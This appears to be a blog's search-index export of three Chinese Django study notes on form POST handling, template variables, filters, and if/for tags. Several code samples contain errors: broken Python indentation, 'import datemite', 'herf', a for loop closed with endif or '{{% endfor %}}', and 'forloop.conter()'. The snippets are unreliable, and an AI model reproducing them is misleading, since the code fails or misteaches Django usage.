class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Dokey<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/search_post/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">      &#123;% csrf_token %&#125;</span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;q&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;搜索&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;rlt&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在模板的末尾，增加一个rlt记号，为表格处理结果预留位置。<br>表格后面有一个{csrf_token}标签。这是Django提供的防止伪装提交请求的功能。POST方法提交的表格，必须有此标签。</p><h4 id="search-post-py-文件代码"><a href="#search-post-py-文件代码" class="headerlink" title="search_post.py 文件代码"></a>search_post.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.views.decorators <span class="keyword">import</span> csrf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_post</span>(<span class="params">request</span>):</span><br><span class="line">ctx = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> request.POST:</span><br><span class="line">    ctx[<span class="string">&#x27;rlt&#x27;</span>] = request.POST[<span class="string">&#x27;q&#x27;</span>]</span><br><span class="line">     <span class="keyword">return</span> render(request, <span class="string">&#x27;search_post.html&#x27;</span>, ctx)</span><br></pre></td></tr></table></figure><h4 id="urls-py-文件代码-1"><a href="#urls-py-文件代码-1" class="headerlink" title="urls.py 文件代码"></a>urls.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views,search_post</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">url(<span class="string">r&#x27;^search_post/$&#x27;</span>, search_post.search_post)</span><br><span class="line">    <span class="comment">#path(&quot;search_post.html&quot;, search_post.search_post)</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><em>Tips：</em>使用path()亦可，在search_post.html中form标签action属性中指定值为&#x2F;search_post&#x2F;时会报404错误，所以使用url()。</p>]]></content>
      
      
      <categories>
          
          <category> Django </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Djange学习笔记-02</title>
      <link href="/18004.html"/>
      <url>/18004.html</url>
      
        <content type="html"><![CDATA[<h1 id="Django模板标签"><a href="#Django模板标签" class="headerlink" title="Django模板标签"></a>Django模板标签</h1><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h4 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h4><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">view: &#123;&quot;HTML变量名&quot; ：&quot;views变量名&quot;&#125;</span></span><br><span class="line"><span class="language-xml">HTML: </span><span class="template-variable">&#123;&#123;变量名&#125;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="views-py-文件代码"><a href="#views-py-文件代码" class="headerlink" title="views.py 文件代码"></a>views.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runoob</span>(<span class="params">request</span>):</span><br><span class="line">views_name = <span class="string">&quot;okay dokey yo!&quot;</span></span><br><span class="line">   <span class="keyword">return</span> render(request, <span class="string">&#x27;runoob.html&#x27;</span>, &#123;<span class="string">&quot;name&quot;</span>:views_name&#125;)</span><br></pre></td></tr></table></figure><h4 id="templates中的runoob-html"><a href="#templates中的runoob-html" class="headerlink" title="templates中的runoob.html"></a>templates中的runoob.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;name&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>templates中的runoob.html中，可以用.索引下标取出对应的元素</p><h4 id="views-py-文件代码-1"><a href="#views-py-文件代码-1" class="headerlink" title="views.py 文件代码"></a>views.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runoob</span>(<span class="params">request</span>):</span><br><span class="line">views_list = [<span class="string">&quot;okay&quot;</span>, <span class="string">&quot;dokey&quot;</span>, <span class="string">&quot;yo&quot;</span>]</span><br><span class="line">   <span class="keyword">return</span> render(request, <span class="string">&#x27;runoob.html&#x27;</span>, &#123;<span class="string">&quot;views_list&quot;</span>: views_list&#125;)</span><br></pre></td></tr></table></figure><h4 id="templates中的runoob-html-1"><a href="#templates中的runoob-html-1" class="headerlink" title="templates中的runoob.html"></a>templates中的runoob.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;views_list&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;views_list.1&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>templates中的runoob.html中，可以用 <strong>.键</strong> 取出对应的值</p><h4 id="views-py-文件代码-2"><a href="#views-py-文件代码-2" class="headerlink" title="views.py 文件代码"></a>views.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runoob</span>(<span class="params">request</span>):</span><br><span class="line">views_dict = &#123;<span class="string">&quot;name&quot;</span> : <span class="string">&quot;okay dokey&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;runoob.html&#x27;</span>, &#123;<span class="string">&quot;views_dict&quot;</span>:views_dict&#125;)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h4 id="templates中的runoob-html-2"><a href="#templates中的runoob-html-2" class="headerlink" title="templates中的runoob.html"></a>templates中的runoob.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;views_dict&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;views_dict.name&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>模板语法:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;变量名|过滤器:可选参数&#125;&#125;</span><br></pre></td></tr></table></figure><p>模板过滤器可以在变量被现实前修改它,过滤器使用管道字符:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;name|lower&#125;&#125;</span><br><span class="line">#&#123;&#123;name&#125;&#125;变量被过滤器lower处理后,文档大写转换文本成小写</span><br></pre></td></tr></table></figure><p>过滤管道可以被<strong>套接</strong> ,一个过滤管道的输出又可以作为下一个管道的输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;my_list|first|upper&#125;&#125;</span><br><span class="line">#将第一个元素转化为大写</span><br></pre></td></tr></table></figure><p>过滤器的参数跟随冒号之后并且总是以双引号包含:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;bio|truncatewords:&quot;30&quot;&#125;&#125;</span><br><span class="line">#显示变量bio前30个词</span><br></pre></td></tr></table></figure><p><strong>其他过滤器:</strong></p><ul><li>addslashes:添加反斜杠到任何反斜杠\单引号或者双引号前面</li><li>date:按指定的格式字符串参数格式化date或者datetime对象:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   &#123;&#123;pub_date|date:&quot;F j, Y&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></li><li>length:返回变量的长度</li></ul><h3 id="default"><a href="#default" class="headerlink" title="default"></a>default</h3><p>default为变量提供一个默认值<br>如果views传的变量的布尔值是false,则使用指定的默认值<br>以下值为false:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0.0 False 0j &quot;&quot; [] () set() &#123;&#125; None    </span><br></pre></td></tr></table></figure><h4 id="views-py-文件代码-3"><a href="#views-py-文件代码-3" class="headerlink" title="views.py 文件代码"></a>views.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runoob</span>(<span class="params">request</span>):</span><br><span class="line">views_name = <span class="number">0</span></span><br><span class="line">   <span class="keyword">return</span> render(request, <span class="string">&#x27;runoob.html&#x27;</span>, &#123;<span class="string">&quot;views_name&quot;</span>: views_name&#125;)</span><br></pre></td></tr></table></figure><h4 id="templates中runobb-html"><a href="#templates中runobb-html" class="headerlink" title="templates中runobb.html"></a>templates中runobb.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;views_name|default:&quot;okay dokey&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="length"><a href="#length" class="headerlink" title="length"></a>length</h3><p>返回对象的长度,适用于字符串和列表<br>字典返回的键值对的数量,集合返回的是去重后的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runoob</span>(<span class="params">request</span>):</span><br><span class="line">views_name = <span class="string">&quot;okay dokey&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;runoob.html&#x27;</span>, &#123;<span class="string">&quot;views_name&quot;</span>: views_name&#125;)</span><br></pre></td></tr></table></figure><h4 id="templatest中runoob-html"><a href="#templatest中runoob-html" class="headerlink" title="templatest中runoob.html"></a>templatest中runoob.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;views_name|length&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="filesizeformat"><a href="#filesizeformat" class="headerlink" title="filesizeformat"></a>filesizeformat</h3><p>以更易读的方式显示文件的大小(即’13 KB’,’5 MB’,’10 bytes’等)<br>字典返回的是键值对的数量,集合返回的是去重后的长度</p><h4 id="views-py-文件代码-4"><a href="#views-py-文件代码-4" class="headerlink" title="views.py 文件代码"></a>views.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runoob</span>(<span class="params">request</span>):</span><br><span class="line">num = <span class="number">1024</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;runoob.html&#x27;</span>, &#123;<span class="string">&quot;num&quot;</span>: num&#125;)</span><br></pre></td></tr></table></figure><h4 id="templates中runoob-html"><a href="#templates中runoob-html" class="headerlink" title="templates中runoob.html"></a>templates中runoob.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;num|filesizeformat&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p>根据给定格式对一个日期变量进行格式化<br>格式<strong>Y-m-d H:i:s</strong>返回<strong>年-月-日 小时-分钟-秒</strong>的格式时间</p><h4 id="views-py-文件代码-5"><a href="#views-py-文件代码-5" class="headerlink" title="views.py 文件代码"></a>views.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runoob</span>(<span class="params">request</span>):</span><br><span class="line"><span class="keyword">import</span> datemite</span><br><span class="line">   now = datetime.datetime.now()</span><br><span class="line">   <span class="keyword">return</span> render(request, <span class="string">&#x27;runoob.html&#x27;</span>, &#123;<span class="string">&quot;now&quot;</span>:now&#125;)</span><br></pre></td></tr></table></figure><h4 id="templatest中runoob-html-1"><a href="#templatest中runoob-html-1" class="headerlink" title="templatest中runoob.html"></a>templatest中runoob.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;now|date:&quot;Y-m-d&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="truncatechars"><a href="#truncatechars" class="headerlink" title="truncatechars"></a>truncatechars</h3><p>如果字符串包含的字符总个数多于指定的字符数量,那么会被截断掉后面的部分.<br>截断的字符串将以 <strong>…</strong> 结尾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runoob</span>(<span class="params">request</span>):</span><br><span class="line">views_name = <span class="string">&#x27;okay dokey&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;runoob.html&#x27;</span>, &#123;<span class="string">&quot;views_name&quot;</span>: views_name&#125;)</span><br></pre></td></tr></table></figure><h4 id="templates中runoob-html-1"><a href="#templates中runoob-html-1" class="headerlink" title="templates中runoob.html"></a>templates中runoob.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;views_name|truncatechars:2&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="safe"><a href="#safe" class="headerlink" title="safe"></a>safe</h3><p>将字符串标记为安全,不需要转义<br>要保证views.py传过来的数据绝对安全,才能用safe<br>和后端views.py的make_safe效果相同.<br>Django会自动对views.py传到HTML文件中的标签语法进行转义,令其语义失效.加safe过滤器是告诉Django该数据是安全的,不必对其进行转义,可以让该数据语义生效.</p><h4 id="views-py-文件代码-6"><a href="#views-py-文件代码-6" class="headerlink" title="views.py 文件代码"></a>views.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runoob</span>(<span class="params">request</span>):</span><br><span class="line">views_str = <span class="string">&#x27;&lt;a herf=&quot;https://www.baidu.com&quot;&gt;点击跳转&lt;/a&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;runoob.html&#x27;</span>, &#123;&#123;<span class="string">&quot;views_str&quot;</span>: views_str&#125;&#125;)</span><br></pre></td></tr></table></figure><h4 id="templates中runoob-html-2"><a href="#templates中runoob-html-2" class="headerlink" title="templates中runoob.html"></a>templates中runoob.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;views_str|safe&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="if-x2F-else标签"><a href="#if-x2F-else标签" class="headerlink" title="if&#x2F;else标签"></a>if&#x2F;else标签</h3><p>基本语法格式如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if condition %&#125;</span><br><span class="line">...display</span><br><span class="line"> &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>或者:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if condition1 %&#125;</span><br><span class="line">...display</span><br><span class="line">&#123;% elif condiion2 %&#125;</span><br><span class="line">...display</span><br><span class="line"> &#123;% else %&#125;</span><br><span class="line"> ...display</span><br><span class="line"> &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>根据条件判断是否输出.if&#x2F;else支持嵌套</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if %&#125;标签接受and, or或者not关键字来对多个变量做判断,或者对变量取反(not)</span><br><span class="line"></span><br><span class="line">&#123;% if athlete_list and coach_list %&#125;</span><br><span class="line">athletes 和 coaches 变量都是可用.</span><br><span class="line"> &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h4 id="views-py文件代码"><a href="#views-py文件代码" class="headerlink" title="views.py文件代码"></a>views.py文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runobb</span>(<span class="params">request</span>):</span><br><span class="line">num = <span class="number">80</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;runobb.html&#x27;</span>, &#123;<span class="string">&quot;num&quot;</span>: num&#125;)</span><br></pre></td></tr></table></figure><h4 id="templates中runoob-html-3"><a href="#templates中runoob-html-3" class="headerlink" title="templates中runoob.html"></a>templates中runoob.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;%if num&gt;90 and num&lt;=100 %&#125;</span><br><span class="line">优秀</span><br><span class="line">&#123;%elif num&gt;60 and num&lt;=90 %&#125;</span><br><span class="line">合格</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">GG</span><br><span class="line">&#123;% endif %&#125;                        </span><br></pre></td></tr></table></figure><h3 id="for标签"><a href="#for标签" class="headerlink" title="for标签"></a>for标签</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for %&#125;允许我们在一个序列上迭代</span><br><span class="line">与Python的for语句情形类似,循坏语法是for X in Y, Y是要迭代的序列而X是在每一个特定的循坏中使用的变量名称.</span><br><span class="line">每一次循环中,模板系统会渲染在&#123;% for %&#125;和&#123;% endfor %&#125;之间的所有内容.</span><br></pre></td></tr></table></figure><h4 id="views-py-文件代码-7"><a href="#views-py-文件代码-7" class="headerlink" title="views.py 文件代码"></a>views.py 文件代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runoob</span>(<span class="params">request</span>):</span><br><span class="line">views_list = [<span class="string">&#x27;okay&#x27;</span>, <span class="string">&#x27;dokey&#x27;</span>, <span class="string">&#x27;yo&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;runoob.html&#x27;</span>, &#123;<span class="string">&quot;views_list&quot;</span>: views_list&#125;)</span><br></pre></td></tr></table></figure><h4 id="templatest中runoob-html-2"><a href="#templatest中runoob-html-2" class="headerlink" title="templatest中runoob.html"></a>templatest中runoob.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for i in views_list%&#125;</span><br><span class="line">&#123;&#123;i&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>给标签增加一个reversed使得该列表被反向迭代</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for i in views_list %&#125;</span><br><span class="line">&#123;&#123; i &#125;&#125;</span><br><span class="line">&#123;&#123;% endfor %&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h3><p>可以直接使用字典.items方法,用变量的解包分别获取键和值</p><h4 id="views-py-文件代码-8"><a href="#views-py-文件代码-8" class="headerlink" title="views.py 文件代码"></a>views.py 文件代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from django.shortcuts import render</span><br><span class="line"></span><br><span class="line">def runoob(request):</span><br><span class="line">views_dict = &#123;&quot;name&quot;:&quot;dokey&quot;, &quot;age&quot;: 18&#125;</span><br><span class="line">    return render(request, &#x27;runoob.html&#x27;, &#123;&quot;views_dict&quot;: views_dict&#125;)</span><br></pre></td></tr></table></figure><h4 id="templates中runoob-html-4"><a href="#templates中runoob-html-4" class="headerlink" title="templates中runoob.html"></a>templates中runoob.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for i,j in views_dict.items %&#125;</span><br><span class="line">&#123;&#123; i &#125;&#125; ---- &#123;&#123; j &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>在for标签里可以通过forloop变量获取循环序号</p><ul><li>forloop.counter:顺序获取循环序号,从1开始计算</li><li>forloop.conter():顺序获取循环序号,从0开始计算</li><li>forloop.revcounter:倒序获取循环序号,结尾序号为1</li><li>forloop.revcounter():倒序获取循环序号,结尾序号为0</li><li>forloop.first:第一条数据返回True,其他数据返回False</li><li>forloop.last:最后一条数据返回True,其他数据返回False</li></ul>]]></content>
      
      
      <categories>
          
          <category> Django </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Django学习笔记-01</title>
      <link href="/57490.html"/>
      <url>/57490.html</url>
      
        <content type="html"><![CDATA[<h2 id="Django-path-函数"><a href="#Django-path-函数" class="headerlink" title="Django path()函数"></a>Django path()函数</h2><p> Path()函数可以接收四个参数，分别是两个必选参数:router、view和两个可选参数:kwargs、name</p><p> path(router, view, kwargs&#x3D;None, name&#x3D;None)</p><ol><li>router:字符串,表示URL规则,与之匹配的URL会执行对应的第二个参数view.</li><li>view:用于执行与正则表达式匹配的URL请求.</li><li>kwargs:视图使用的字典类型的参数.</li><li>name:用来反向获取URL.</li></li></ol><h2 id="Django-模板"><a href="#Django-模板" class="headerlink" title="Django 模板"></a>Django 模板</h2><ol><li>引用模板文件,修改settings.py;修改TEMPLATES中的DIRS为[os.path.join(BASE_DIR,’templates’)]<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;BACKEND&#x27;</span>: <span class="string">&#x27;django.template.backends.django.DjangoTemplates&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;DIRS&#x27;</span>: [os.path.join(BASE_DIR, <span class="string">&#x27;templates&#x27;</span>)],</span><br><span class="line">        <span class="string">&#x27;APP_DIRS&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&#x27;OPTIONS&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;context_processors&#x27;</span>: [</span><br><span class="line">                <span class="string">&#x27;django.template.context_processors.debug&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;django.template.context_processors.request&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;django.contrib.auth.context_processors.auth&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;django.contrib.messages.context_processors.messages&#x27;</span>,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li>修改views.py,增加一个新对象,用于向模板提交数据:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runoob</span>(<span class="params">request</span>):</span><br><span class="line">   context = &#123;&#125;</span><br><span class="line">    context[<span class="string">&#x27;hello&#x27;</span>] = <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;runoob.html&#x27;</span>, context)</span><br></pre></td></tr></table></figure></li><li>修改urls.py代码<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line">   </span><br><span class="line">urlpatterns = [</span><br><span class="line">path(<span class="string">&#x27;runoob/&#x27;</span>, views.runoob)</span><br><span class="line">   ]</span><br></pre></td></tr></table></figure></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><p> 使用<strong>render</strong>来替代<strong>HttpRequest; render</strong>使用一个字典<strong>context</strong>作为参数, 